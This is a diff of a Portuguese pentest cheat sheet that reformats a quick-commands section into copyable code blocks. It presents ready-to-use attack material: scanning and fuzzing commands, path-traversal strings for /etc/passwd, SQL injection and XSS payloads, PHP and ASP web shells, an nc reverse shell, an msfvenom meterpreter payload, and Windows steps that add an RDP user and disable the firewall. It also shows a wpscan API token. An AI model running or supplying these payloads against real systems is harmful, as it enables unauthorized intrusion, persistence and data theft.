@@ -93,207 +93,268 @@ Tags: `#quickref` `#cheatsheet` `#comandos` `#payloads`
 ### Comandos Rápidos
 Tags: `#quickref` `#cheatsheet` `#comandos` `#payloads` `#ctrlf`
 
-	nmap -vv -sUV -sC -O -p- -A --script vuln -Pn --open -oN saida-save 10.10.10.0/24
-
-
-	ncrack -U user-file -pass senha -p smb -iL host-list
-
-
-	cat saida-nmap.txt | grep \tcp | cut -d "/" -f 1 | grep -v ports | sort -un | tr '\n' ',' > all_ports
-
-
-	gobuster dir -u http://HOST/ -w /usr/share/dirb/wordlists/big.txt -k -t 100 -e --no-error -r -o fuzz-gobuster -a Mozilla/5.0 --exclude-length 123456 -x php,bkp,old,txt,xml,cgi,pdf,html,htm,asp,aspx,pl,sql,js,png,jpg,jpeg,config,sh,cfm,zip,log
-
-
-	feroxbuster --url http://server.com/ --methods GET,POST -r -A -w /usr/share/dirb/wordlists/big.txt -o fuzz-feroxbuster -x php bkp old txt xml cgi pdf html htm asp aspx pl sql js png jpg jpeg config sh cfm zip log
-
-
-	dirsearch -u https://exampl.com/ --crawl --full-url -t 1 --user-agent Mozilla/5.0 -e php,bkp,old,txt,xml,cgi,pdf,html,htm,asp,aspx,pl,sql,js,png,jpg,jpeg,config,sh,cfm,zip,log -o fuzz-dirsearch
-
-
-	ffuf -u http://site/FUZZ -w /usr/share/dirb/wordlists/big.txt -c -t 100 -e .php,.bkp,.old,.txt,.xml,.cgi,.pdf,.html,.htm,.asp,.aspx,.pl,.sql,.js,.png,.jpg,.jpeg,.config,.zip,.log -o output-site-raiz.html -of html
-
-
-	dirb https://sitealvo.com.br/ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -a  Mozilla/5.0 -X .php,.bkp,.old,.txt,.xml,.cgi,.pdf,.html,.htm,.asp,.aspx,.pl,.sql,.js,.png,.jpg,.jpeg,.config,.sh,.cfm,.zip,.log -o dirb-sitealvo-raiz
-
-
-	wpscan --url sub.site.com.br/ --api-token 9iwuoirwer0987wehrEve7tzY3mF9CnxFyiwuer  --random-user-agent --enumerate vp --plugins-detection aggressive
-
-
-	wapiti --scope domain -m all -d 10 -A Mozilla/5.0 -u  url.com.br
-
-
-	sqlmap -r request.txt -p param-to-sqlmap-test --risk=3 --level=5 | echo "EDITE O ARQUIVO E COLOQUE UM * NO CAMPO QUE DESEJA FAZER OS TESTES"
-
-
-	for url $(cat urls);do echo "$domain" && curl -s -o /dev/null -w "%{http_code}\n" --connect-timeout 10 $url;done
-
-
-	jwt_tool.py 'encript.payload.assinatura' --crack -d /usr/share/wordlists/rockyou.txt OU USAR O HASHCAT
-
-
-	amqp-consume --server=127.0.0.1 --port=5672 --vhost=/ --username=guest --password=guest --queue=hello cat
-
-
-	/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd%00
-
-
-	/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-
-
-	%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
-
-
-	/../../../../../../../../../../etc/passwd
-
-
-	/../../../../../../../../../../C:/Windows/System32/drivers/etc/hosts
-
-
-	%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fC%253A%252fWindows%252fSystem32%252fdrivers%252fetc%252fhosts
-
-
-	;dir;#
-
-
-	admin' OR'1'='1--
-	admin' OR 1=1)#
-
-
-	academy.net/?__proto__[foo]=bar
-
-
-	<script>alert('Pentester')</script>
-
-
-	<script>alert`1`</script> | echo "INJETAR SCRIPT NA ATENTATIVA DE DAR BYPASS"
-
-
-	<img src=x onerror=alert`1`>
-	<img src=x OnerrOr=alert`1`>
-
-
-	javascript:alert('XSS href')
-
-
-	<img src="invalid.jpg" onerror="alert('XSS IMG!')">
-
-
-	<img src="x" onerror="window['aler'+'t']('XSS OnError!')">
-
-
-	<iframe src="https://www.retrogames.cc/embed/10030-street-fighter-ii-champion-edition-street-fighter-2-920513-etc.html" width="600" height="450" </iframe>
-
-
-	<iframe src="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KCdYU1MnKT4="></iframe>
-
-
-	<iframe src="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"></iframe>
-
-
-	<script>window.location='http://malicious.com'</script>
-
-
-	?param=1';alert(1)//  | USAR EM UM CENARIO EM QUE O PARAMETRO EXECUTA ALGO DENTRO DE UM SCRIPT. ANALISAR E AJUSTAR O CODIGO DE ACORDO. OBSERVAR ERRO NO CONSOLE
-
-
-	<?php system($_GET['hacker']);?>
-
-
-	<?php system('id');?>
-
-
-	SHELL EM ASP (shell.asp)
-	<%
-	Set oS = Server.CreateObject("WSCRIPT.SHELL")
-	Set objCmdExec = oS.exec("cmd.exe /c ipconfig")
-	getCommandOutput = objCmdExec.StdOut.ReadAll
-	Response.Write getCommandOutput
-	%>
-
-
-	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your_IP> 4444 >/tmp/f
-
-
-	python3 -m http.server 8080
-
-
-	msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.16 lport:443 -f ext -o name.ext
-
-
-	python3 -c 'import pty;pty.spawn("/bin/bash")'
-
-
-	net user suporte 12345 /add
-
-
-	net localgroup "Remote Desktop Users" suporte /ad
-
-
-	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-
-
-	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
-
-
-	NetSh Advfirewall set allprofiles state off
-
-
-	CloudFlare? WAF? CF-HERO e/ou Analisar os registros de históricos da Securitytrails e outra forma é através do E-mail, no receive-from pode haver o IP real
-
-
-	Cloudmare Tool for IP discover while behind a WAF
-
-
-	grep -B 1 '[0-9]' techs | grep -av "\-\-" | sed 's/  */ /g' | grep -v '^$'|paste -d ' ' - - | sort -u > techs-clean
-
-
-	grep -v -f termos.txt file.txt
-
-
-	for i in {1..100}; do echo "numero $i" ;fone
-
-
-	/wp-json/wp/v2/users LISTA USUARIOS DO WORDPRESS
-	?rest_route=/wp/v2/users
-
-
-	grep -v -E '19(1[1-9]|[2-8][0-9]|91)'
- 	Explicação da expressão regular:
-		19: Captura os primeiros dois dígitos do número.
-		1[1-9]: Captura números de 1911 a 1919.
-		[2-8][0-9]: Captura números de 1920 a 1989.
-		91: Captura o número 1991.
-
-
-	mysql -u usuario -p'senha' -D nome_do_banco -e "SHOW TABLES;"
-
-
-	Dalvik/2.1.0 (Linux; U; Android 11; Pixel 5 Build/RQ1A.210205.004)
-	Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
-	Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
-	Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
-	Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.131 Mobile Safari/537.36
-
-
-	wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://sub.site.com.br -U "Dalvik/2.1.0 (Linux; U; Android 11; Pixel 5 Build/RQ1A.210205.004)" -l 999
-
-
-	curl -fsSL https://ollama.com/install.sh | sh
-	ollama pull llama2-uncensored
-	ollama pull deepseek-r1:1.5b :8b :14b :32b
-	ollama run deepseek-r1:32b
-	ollama run llama2-uncensored
-
-
-	apt install -y nvidia-driver nvidia-cuda-toolkit REF: https://www.kali.org/docs/general-use/install-nvidia-drivers-on-kali-linux/
-
-
-	SERVIDOR: vncserver -localhost :1 -geometry 1920x1080 -depth 24
-	CLIENT: sudo apt install tigervnc-viewer
-	CLIENT: ssh -L 5901:localhost:5901 -N -f seu_usuario@IP_DO_SERVIDOR
-	CLIENT VNC: localhost:5901
-
+Cada bloco abaixo é independente para facilitar o uso do botão de copiar do Markdown/GitHub Pages.
+
+```
+nmap -vv -sUV -sC -O -p- -A --script vuln -Pn --open -oN saida-save 10.10.10.0/24
+```
+
+```
+ncrack -U user-file -pass senha -p smb -iL host-list
+```
+
+```
+cat saida-nmap.txt | grep \tcp | cut -d "/" -f 1 | grep -v ports | sort -un | tr '\n' ',' > all_ports
+```
+
+```
+gobuster dir -u http://HOST/ -w /usr/share/dirb/wordlists/big.txt -k -t 100 -e --no-error -r -o fuzz-gobuster -a Mozilla/5.0 --exclude-length 123456 -x php,bkp,old,txt,xml,cgi,pdf,html,htm,asp,aspx,pl,sql,js,png,jpg,jpeg,config,sh,cfm,zip,log
+```
+
+```
+feroxbuster --url http://server.com/ --methods GET,POST -r -A -w /usr/share/dirb/wordlists/big.txt -o fuzz-feroxbuster -x php bkp old txt xml cgi pdf html htm asp aspx pl sql js png jpg jpeg config sh cfm zip log
+```
+
+```
+dirsearch -u https://exampl.com/ --crawl --full-url -t 1 --user-agent Mozilla/5.0 -e php,bkp,old,txt,xml,cgi,pdf,html,htm,asp,aspx,pl,sql,js,png,jpg,jpeg,config,sh,cfm,zip,log -o fuzz-dirsearch
+```
+
+```
+ffuf -u http://site/FUZZ -w /usr/share/dirb/wordlists/big.txt -c -t 100 -e .php,.bkp,.old,.txt,.xml,.cgi,.pdf,.html,.htm,.asp,.aspx,.pl,.sql,.js,.png,.jpg,.jpeg,.config,.zip,.log -o output-site-raiz.html -of html
+```
+
+```
+dirb https://sitealvo.com.br/ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -a  Mozilla/5.0 -X .php,.bkp,.old,.txt,.xml,.cgi,.pdf,.html,.htm,.asp,.aspx,.pl,.sql,.js,.png,.jpg,.jpeg,.config,.sh,.cfm,.zip,.log -o dirb-sitealvo-raiz
+```
+
+```
+wpscan --url sub.site.com.br/ --api-token 9iwuoirwer0987wehrEve7tzY3mF9CnxFyiwuer  --random-user-agent --enumerate vp --plugins-detection aggressive
+```
+
+```
+wapiti --scope domain -m all -d 10 -A Mozilla/5.0 -u  url.com.br
+```
+
+```
+sqlmap -r request.txt -p param-to-sqlmap-test --risk=3 --level=5 | echo "EDITE O ARQUIVO E COLOQUE UM * NO CAMPO QUE DESEJA FAZER OS TESTES"
+```
+
+```
+for url $(cat urls);do echo "$domain" && curl -s -o /dev/null -w "%{http_code}\n" --connect-timeout 10 $url;done
+```
+
+```
+jwt_tool.py 'encript.payload.assinatura' --crack -d /usr/share/wordlists/rockyou.txt OU USAR O HASHCAT
+```
+
+```
+amqp-consume --server=127.0.0.1 --port=5672 --vhost=/ --username=guest --password=guest --queue=hello cat
+```
+
+```
+/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd%00
+```
+
+```
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+```
+
+```
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+```
+
+```
+/../../../../../../../../../../etc/passwd
+```
+
+```
+/../../../../../../../../../../C:/Windows/System32/drivers/etc/hosts
+```
+
+```
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fC%253A%252fWindows%252fSystem32%252fdrivers%252fetc%252fhosts
+```
+
+```
+;dir;#
+```
+
+```
+admin' OR'1'='1--
+admin' OR 1=1)#
+```
+
+```
+academy.net/?__proto__[foo]=bar
+```
+
+```
+<script>alert('Pentester')</script>
+```
+
+```
+<script>alert`1`</script> | echo "INJETAR SCRIPT NA ATENTATIVA DE DAR BYPASS"
+```
+
+```
+<img src=x onerror=alert`1`>
+<img src=x OnerrOr=alert`1`>
+```
+
+```
+javascript:alert('XSS href')
+```
+
+```
+<img src="invalid.jpg" onerror="alert('XSS IMG!')">
+```
+
+```
+<img src="x" onerror="window['aler'+'t']('XSS OnError!')">
+```
+
+```
+<iframe src="https://www.retrogames.cc/embed/10030-street-fighter-ii-champion-edition-street-fighter-2-920513-etc.html" width="600" height="450" </iframe>
+```
+
+```
+<iframe src="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KCdYU1MnKT4="></iframe>
+```
+
+```
+<iframe src="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"></iframe>
+```
+
+```
+<script>window.location='http://malicious.com'</script>
+```
+
+```
+?param=1';alert(1)//  | USAR EM UM CENARIO EM QUE O PARAMETRO EXECUTA ALGO DENTRO DE UM SCRIPT. ANALISAR E AJUSTAR O CODIGO DE ACORDO. OBSERVAR ERRO NO CONSOLE
+```
+
+```
+<?php system($_GET['hacker']);?>
+```
+
+```
+<?php system('id');?>
+```
+
+```
+SHELL EM ASP (shell.asp)
+<%
+Set oS = Server.CreateObject("WSCRIPT.SHELL")
+Set objCmdExec = oS.exec("cmd.exe /c ipconfig")
+getCommandOutput = objCmdExec.StdOut.ReadAll
+Response.Write getCommandOutput
+%>
+```
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your_IP> 4444 >/tmp/f
+```
+
+```
+python3 -m http.server 8080
+```
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.16 lport:443 -f ext -o name.ext
+```
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+```
+net user suporte 12345 /add
+```
+
+```
+net localgroup "Remote Desktop Users" suporte /ad
+```
+
+```
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+```
+
+```
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+```
+
+```
+NetSh Advfirewall set allprofiles state off
+```
+
+```
+CloudFlare? WAF? CF-HERO e/ou Analisar os registros de históricos da Securitytrails e outra forma é através do E-mail, no receive-from pode haver o IP real
+```
+
+```
+Cloudmare Tool for IP discover while behind a WAF
+```
+
+```
+grep -B 1 '[0-9]' techs | grep -av "\-\-" | sed 's/  */ /g' | grep -v '^$'|paste -d ' ' - - | sort -u > techs-clean
+```
+
+```
+grep -v -f termos.txt file.txt
+```
+
+```
+for i in {1..100}; do echo "numero $i" ;fone
+```
+
+```
+/wp-json/wp/v2/users LISTA USUARIOS DO WORDPRESS
+?rest_route=/wp/v2/users
+```
+
+```
+grep -v -E '19(1[1-9]|[2-8][0-9]|91)'
+Explicação da expressão regular:
+	19: Captura os primeiros dois dígitos do número.
+	1[1-9]: Captura números de 1911 a 1919.
+	[2-8][0-9]: Captura números de 1920 a 1989.
+	91: Captura o número 1991.
+```
+
+```
+mysql -u usuario -p'senha' -D nome_do_banco -e "SHOW TABLES;"
+```
+
+```
+Dalvik/2.1.0 (Linux; U; Android 11; Pixel 5 Build/RQ1A.210205.004)
+Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
+Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
+Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
+Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.131 Mobile Safari/537.36
+```
+
+```
+wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://sub.site.com.br -U "Dalvik/2.1.0 (Linux; U; Android 11; Pixel 5 Build/RQ1A.210205.004)" -l 999
+```
+
+```
+curl -fsSL https://ollama.com/install.sh | sh
+ollama pull llama2-uncensored
+ollama pull deepseek-r1:1.5b :8b :14b :32b
+ollama run deepseek-r1:32b
+ollama run llama2-uncensored
+```
+
+```
+apt install -y nvidia-driver nvidia-cuda-toolkit REF: https://www.kali.org/docs/general-use/install-nvidia-drivers-on-kali-linux/
+```
+
+```
+SERVIDOR: vncserver -localhost :1 -geometry 1920x1080 -depth 24
+CLIENT: sudo apt install tigervnc-viewer
+CLIENT: ssh -L 5901:localhost:5901 -N -f seu_usuario@IP_DO_SERVIDOR
+CLIENT VNC: localhost:5901
+```
 
 ### Script Selenium: Brute Force de Login no Firefox
 Tags: `#script` `#selenium` `#bruteforce` `#web` `#firefox`
